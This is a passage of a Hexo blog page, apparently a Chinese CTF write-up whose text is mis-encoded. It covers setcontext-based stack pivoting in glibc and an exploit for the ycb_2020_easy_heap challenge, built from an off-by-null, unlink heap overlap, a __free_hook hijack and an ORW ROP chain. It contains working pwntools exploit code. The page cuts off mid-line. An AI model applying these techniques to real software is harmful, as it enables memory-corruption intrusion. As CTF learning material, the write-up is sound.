<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CharonPtçš„Blog">
<meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/index.html">
<meta property="og:site_name" content="CharonPtçš„Blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://github.com/CharonPt/CharonPt.github.io.git/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>CharonPtçš„Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CharonPtçš„Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/21/setcontext-orw/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPtçš„Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/21/setcontext-orw/" class="post-title-link" itemprop="url">setcontext+orw</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-05-21 18:58:36 / ä¿®æ”¹æ—¶é—´ï¼š21:11:58" itemprop="dateCreated datePublished" datetime="2022-05-21T18:58:36+08:00">2022-05-21</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="å †é¢˜çš„orw"><a href="#å †é¢˜çš„orw" class="headerlink" title="å †é¢˜çš„orw"></a>å †é¢˜çš„orw</h3><p>åœ¨ä¸€é“å †é¢˜é‡Œæˆ‘ä»¬æƒ³è¦å®Œæˆorwçš„æ“ä½œå°±éœ€è¦æˆ‘ä»¬æ§åˆ¶ä¸¤ä¸ªä¸œè¥¿ï¼šspæŒ‡é’ˆè·ŸipæŒ‡é’ˆã€‚ä¸ºæ­¤æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨setcontext</p>
<h3 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h3><p>é¦–å…ˆè¿™æ˜¯ä¸ªlibcé‡Œçš„å‡½æ•°ï¼Œéœ€è¦ç”¨åˆ°å®ƒæ˜¯å› ä¸ºå®ƒé‡Œé¢å­˜åœ¨ä¸€äº›æˆ‘ä»¬æ‰€éœ€è¦çš„gadgetï¼Œæ€»çš„æ¥è¯´å…¶å®è·Ÿret2csuå·®ä¸å¤šã€‚</p>
<p>è¿™ä¸ªå‡½æ•°çš„åˆ©ç”¨å¤§æ¦‚å¯ä»¥ä»¥glibc-2.29ä¸ºåˆ†ç•Œçº¿ï¼Œè¿™æ˜¯å› ä¸ºåœ¨glibc-2.29åŠä¹‹åæˆ‘ä»¬æ‰€ç”¨åˆ°çš„gadgetå˜æˆä»¥rdxä¸ºç´¢å¼•ã€‚ä»¥glibc-2.30ä¸ºä¾‹ï¼Œå®ƒé•¿è¿™æ ·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000058000 ; __unwind &#123;</span><br><span class="line">.text:0000000000058000                 endbr64</span><br><span class="line">.text:0000000000058004                 push    rdi</span><br><span class="line">.text:0000000000058005                 lea     rsi, [rdi+128h] ; nset</span><br><span class="line">.text:000000000005800C                 xor     edx, edx        ; oset</span><br><span class="line">.text:000000000005800E                 mov     edi, 2          ; how</span><br><span class="line">.text:0000000000058013                 mov     r10d, 8         ; sigsetsize</span><br><span class="line">.text:0000000000058019                 mov     eax, 0Eh</span><br><span class="line">.text:000000000005801E                 syscall                 ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:0000000000058020                 pop     rdx</span><br><span class="line">.text:0000000000058021                 cmp     rax, 0FFFFFFFFFFFFF001h</span><br><span class="line">.text:0000000000058027                 jnb     loc_5814F</span><br><span class="line">.text:000000000005802D                 mov     rcx, [rdx+0E0h]</span><br><span class="line">.text:0000000000058034                 fldenv  byte ptr [rcx]</span><br><span class="line">.text:0000000000058036                 ldmxcsr dword ptr [rdx+1C0h]</span><br><span class="line">.text:000000000005803D                 mov     rsp, [rdx+0A0h]</span><br><span class="line">.text:0000000000058044                 mov     rbx, [rdx+80h]</span><br><span class="line">.text:000000000005804B                 mov     rbp, [rdx+78h]</span><br><span class="line">.text:000000000005804F                 mov     r12, [rdx+48h]</span><br><span class="line">.text:0000000000058053                 mov     r13, [rdx+50h]</span><br><span class="line">.text:0000000000058057                 mov     r14, [rdx+58h]</span><br><span class="line">.text:000000000005805B                 mov     r15, [rdx+60h]</span><br><span class="line">.text:000000000005805F                 test    dword ptr fs:48h, 2</span><br><span class="line">.text:000000000005806B                 jz      loc_58126</span><br><span class="line">......</span><br><span class="line">.text:0000000000058126 loc_58126:                              ; CODE XREF: setcontext+6Bâ†‘j</span><br><span class="line">.text:0000000000058126                 mov     rcx, [rdx+0A8h]</span><br><span class="line">.text:000000000005812D                 push    rcx</span><br><span class="line">.text:000000000005812E                 mov     rsi, [rdx+70h]</span><br><span class="line">.text:0000000000058132                 mov     rdi, [rdx+68h]</span><br><span class="line">.text:0000000000058136                 mov     rcx, [rdx+98h]</span><br><span class="line">.text:000000000005813D                 mov     r8, [rdx+28h]</span><br><span class="line">.text:0000000000058141                 mov     r9, [rdx+30h]</span><br><span class="line">.text:0000000000058145                 mov     rdx, [rdx+88h]</span><br><span class="line">.text:0000000000058145 ; &#125; // starts at 58000</span><br><span class="line">.text:000000000005814C ; __unwind &#123;</span><br><span class="line">.text:000000000005814C                 xor     eax, eax</span><br><span class="line">.text:000000000005814E                 retn</span><br></pre></td></tr></table></figure>

<p>é‡ç‚¹åœ¨setcontext+61å¼€å§‹ï¼š<code>mov     rsp, [rdx+0A0h]</code>ï¼Œä»¥åŠåç»­çš„<code>mov     rcx, [rdx+0A8h]; push    rcx;  ...... ;retn;</code></p>
<p>è¿™ä¸ªè¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥é€šè¿‡rdxæ¥æ§åˆ¶rspè·Ÿæœ€åçš„è¿”å›åœ°å€ã€‚</p>
<p>å¯¹äºglibc-2.27åŠä¹‹å‰çš„ç‰ˆæœ¬ï¼Œsetcontextç”¨rdiä½œä¸ºç´¢å¼•ï¼Œæ§åˆ¶èµ·æ¥è¦æ›´ç®€å•ï¼Œå› ä¸º<code>__free_hook</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯æ§çš„ï¼Œåªéœ€è¦è®¾ç½®å¥½rdiçš„å€¼å°±èƒ½åœ¨è·³åˆ°setcontextä¹‹åä¿®æ”¹ç›®æ ‡å¯„å­˜å™¨çš„å€¼ï¼Œç„¶åé¡ºåˆ©æ‰§è¡Œæå‰å¸ƒç½®å¥½çš„orw chain</p>
<p>å¯¹äºglibc-2.29åŠä¹‹åçš„ç‰ˆæœ¬ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ç”¨ä¸€æ®µROPå»æ§åˆ¶rdxçš„å€¼æ‰è¡Œ</p>
<p>åœ¨glibc-2.29-2.32ä¸­æœ‰ä¸€æ®µgadgetå°±å¾ˆé€‚ç”¨ï¼Œå…¶ä½äº<code>getkeyserv_handle+567</code>ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov    rdx, qword ptr [rdi + 8]</span><br><span class="line">mov    qword ptr [rsp], rax</span><br><span class="line">call   qword ptr [rdx + 0x20]</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡è¿™æ®µgadgetæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡rdiæ¥æ§åˆ¶rdxï¼Œå¹¶ä¸”åœ¨callæŒ‡ä»¤ä¸­è·³åˆ°setcontextå®Œæˆåç»­æ­¥éª¤ã€‚</p>
<h3 id="ycb-2020-easy-heap"><a href="#ycb-2020-easy-heap" class="headerlink" title="ycb_2020_easy_heap"></a>ycb_2020_easy_heap</h3><h4 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h4><p>ï¼ˆlibc-2.30ï¼‰</p>
<p>èœå•å¦‚ä¸‹ï¼Œåˆ†åˆ«å¯¹åº”addã€editã€freeã€show</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----Welcome --------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Take a card&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Edit&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Drop a card&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.Take a view&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5.Exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Choice:&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨editåŠŸèƒ½å‡½æ•°é‡Œæœ‰ä¸ªoff-by-null</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v2 = sub_143F();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0xFF</span> || !qword_4460[v2] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Don not exist!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  v0 = qword_4460[v2];</span><br><span class="line">  v0[read(<span class="number">0</span>, v0, qword_4060[v2])] = <span class="number">0</span>;          <span class="comment">// off-by-null</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;[+]Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>addåŠŸèƒ½å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xFF</span> &amp;&amp; qword_4460[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  qword_4060[i] = sub_143F();</span><br><span class="line">  qword_4460[i] = <span class="built_in">malloc</span>(qword_4060[i]);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_4460[i] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!]Something Wrong!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;[+]Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ«çš„éƒ½å¾ˆå¸¸è§„å°±ä¸è´´äº†</p>
<h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p>ä¿æŠ¤å…¨å¼€ï¼Œä»¥åŠå¼€äº†æ²™ç®±ï¼Œè¦ç”¨orwæ¥åš</p>
<h4 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><p>å¼•ç”¨åˆ«çš„åšå®¢çš„æ€»ç»“</p>
<blockquote>
<p>é«˜ç‰ˆæœ¬çš„<code>off by null</code>ä¸èƒ½åƒä¹‹å‰é‚£æ ·éšä¾¿åœ°åå‘åˆå¹¶äº†ï¼Œå› ä¸ºå¯¹<code>size</code>åŸŸçš„æ£€æŸ¥æ›´åŠ ä¸¥æ ¼ã€‚å› æ­¤ï¼Œåœ¨é«˜ç‰ˆæœ¬çš„<code>off by null</code>ï¼Œåˆ©ç”¨å§¿åŠ¿å°ç»“å¦‚ä¸‹ï¼š</p>
<ul>
<li>å¦‚æœæœ‰åœ°å€æ³„éœ²ï¼Œæœ€èµ·ç å¯ä»¥æ³„éœ²å‡º<code>libc</code>åœ°å€ï¼Œå¯ä»¥åˆ©ç”¨<code>last_remainder</code>è¿™ä¸ªæŒ‡é’ˆï¼›å¦‚æœèƒ½æ³„éœ²å‡ºå †åœ°å€ï¼Œç›´æ¥æ„é€ <code>unlink</code>å³å¯</li>
<li>å¦‚æœæ²¡æœ‰åœ°å€æ³„éœ²ï¼Œå¯ä»¥åˆ©ç”¨æ®‹ç•™åœ°å€ï¼Œè¿›è¡Œåˆ©ç”¨ï¼Œä¸»è¦æ˜¯<code>largebin</code>çš„<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>ï¼Œ<code>samllbin</code>çš„æ®‹ç•™<code>bk</code>å’Œ<code>fastbin</code>çš„æ®‹ç•™<code>fd</code>ã€‚å›´ç»•è¿™å‡ ä¸ªæ„é€ å †é‡å ã€‚</li>
</ul>
</blockquote>
<p>ä»–è¯´é«˜ç‰ˆæœ¬å¤šäº†äº›sizeåŸŸçš„æ£€æŸ¥ï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä¹Ÿæ²¡æ€»ç»“è¿‡å“ªäº›ä¿æŠ¤åœ¨å“ªäº›ç‰ˆæœ¬æ˜¯æœ‰çš„ï¼Œå“ªäº›ç‰ˆæœ¬æ–°å‡ºäº†å•¥å•¥ä¿æŠ¤ä¹‹ç±»çš„ï¼Œæ‰€ä»¥ä¸æ˜¯ç‰¹åˆ«æ¸…æ¥š</p>
<p>ç¬¬ä¸€ç‚¹é‡Œçš„åˆ©ç”¨<code>last remainder</code>æŒ‡é’ˆä¹Ÿæ²¡æ‡‚æ˜¯å•¥æ„æ€ï¼Œåé¢æœ‰é¢˜ç›®ç”¨åˆ°äº†å†å›æ¥è¡¥å§ã€‚</p>
<p>åˆ©ç”¨æ®‹ç•™æŒ‡é’ˆå°±æ˜¯æŒ‡è™½ç„¶ç¨‹åºä¸­ä¸å­˜åœ¨uafæ¼æ´ï¼Œä½†æ˜¯åœ¨æœ‰showçš„æƒ…å†µä¸‹å¯ä»¥é€šè¿‡æŠŠä¸€äº›ç±»å‹çš„chunk freeæ‰ï¼Œç„¶åå†æ‹¿å›æ¥ï¼Œé€šè¿‡å…¶å…¥binæ—¶ç•™ä¸‹çš„æŒ‡é’ˆæ¥è¿›è¡Œåœ°å€çš„æ³„æ¼ï¼Œè¿™ä¸ªè¿˜æ˜¯å¾ˆå¥½æ‡‚çš„ã€‚</p>
<p>å°†è¿™é“é¢˜åˆ†åˆ«ä¸¤éƒ¨åˆ†æ¥è®²ï¼šé¦–å…ˆæ˜¯æ„é€ å †é‡å æ¥æ§åˆ¶tcacheçš„fdæŒ‡é’ˆï¼ŒåŠ«æŒ<code>__free_hook</code>ã€‚ç„¶åå°±æ˜¯åˆ©ç”¨setcontextæ¥å®Œæˆorwçš„è¿‡ç¨‹ã€‚</p>
<h4 id="æ„é€ å †é‡å "><a href="#æ„é€ å †é‡å " class="headerlink" title="æ„é€ å †é‡å "></a>æ„é€ å †é‡å </h4><p>è¿™ä¸€éƒ¨åˆ†å…¶å®æ¯”è¾ƒå¸¸è§„ï¼Œåªè¦åˆ©ç”¨unlinkæ¥å®Œæˆå †é‡å å³å¯ï¼Œè¿‡ç¨‹å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x410</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x4f0</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x410</span>)<span class="comment">#3</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7f7db95ecbe0</span> - <span class="number">0x00007f7db9402000</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base = &quot;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line">setcontext = libc_base + (<span class="number">0x7f4e6f508000</span> - <span class="number">0x00007f4e6f4b0000</span>)</span><br><span class="line">free_hook = libc_base + (<span class="number">0x7f4e6f69db20</span> - <span class="number">0x00007f4e6f4b0000</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x6c0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base = &quot;</span>,<span class="built_in">hex</span>(heap_base)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x470</span>) + p64(heap_base+<span class="number">0x6f0</span> - <span class="number">0x18</span>) + p64(heap_base+<span class="number">0x6f0</span> - <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0x470</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(heap_base+<span class="number">0x2a0</span>))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#hijack</span></span><br><span class="line">add(<span class="number">0x460</span>)<span class="comment">#3</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span> + p64(<span class="number">0x420</span>) + p64(<span class="number">0x31</span>) + p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#2</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€éƒ¨åˆ†å€¼å¾—æ³¨æ„çš„æ˜¯fake_chunkä¸­fdè·ŸbkæŒ‡é’ˆçš„æ„é€ ï¼Œå› ä¸ºæˆ‘ä»¬æ— æ³•æ³„æ¼ç¨‹åºåŸºå€çš„ç¼˜æ•…ï¼Œæˆ‘ä»¬æ— æ³•çŸ¥é“åœ¨.bssä¸­ä¿å­˜çš„<code>&amp;P</code>çš„åœ°å€ï¼Œä½†æ˜¯å¯ä»¥æ¢ä¸ªæ€è·¯ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨æŸä¸ªchunké‡Œå†™å…¥<code>P</code>çš„åœ°å€ï¼Œè€Œå †åœ°å€æ˜¯å¯ä»¥æ³„éœ²çš„ï¼Œè¿™æ ·æˆ‘ä»¬åŒæ ·å¯ä»¥ç»•è¿‡unlinkçš„æ£€æµ‹ï¼Œå¯¹äºä¸Šé¢çš„expæ¥è®²å°±æ˜¯å€’æ•°ç¬¬äºŒè¡Œé‚£æ­¥</p>
<p>å½“ç„¶<code>P</code>çš„åœ°å€ä¹Ÿä¸ä¸€å®šè¦æˆ‘ä»¬æ‰‹åŠ¨å†™å…¥ï¼Œæœ‰æ—¶ä¹Ÿå¯ä»¥åˆ©ç”¨å †ä¸­æ®‹ç•™çš„æŒ‡é’ˆæ¥å®ç°ã€‚</p>
<h4 id="gadget-setcontext-orw"><a href="#gadget-setcontext-orw" class="headerlink" title="gadget + setcontext + orw"></a>gadget + setcontext + orw</h4><p>å› ä¸ºæ˜¯glibc-2.30çš„ç‰ˆæœ¬ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨åˆ°äº†å‰é¢è®²çš„<code>getkeyserv_handle+567</code>é‡Œçš„gadget</p>
<p>æˆ‘ä»¬å°†<code>__free_hook</code>ä¿®æ”¹æˆè¿™ä¸ªgadgetçš„åœ°å€</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mov    rdx,QWORD PTR [rdi+0x8]</span></span><br><span class="line"><span class="comment">#mov    QWORD PTR [rsp],rax</span></span><br><span class="line"><span class="comment">#call   QWORD PTR [rdx+0x20]</span></span><br><span class="line">gadget = libc_base + (<span class="number">0x7fc0540d8b20</span> - <span class="number">0x00007fc053f84000</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(gadget))</span><br></pre></td></tr></table></figure>

<p>ç„¶åéšä¾¿æ‰¾äº›åœ°æ–¹å†™å…¥orw chainä»¥åŠflagå­—ç¬¦ä¸²</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = libc_base + libc.search(asm(<span class="string">&quot;pop rdi\nret&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">pop_rsi = libc_base + libc.search(asm(<span class="string">&quot;pop rsi\nret&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">pop_rdx_r12 = libc_base + <span 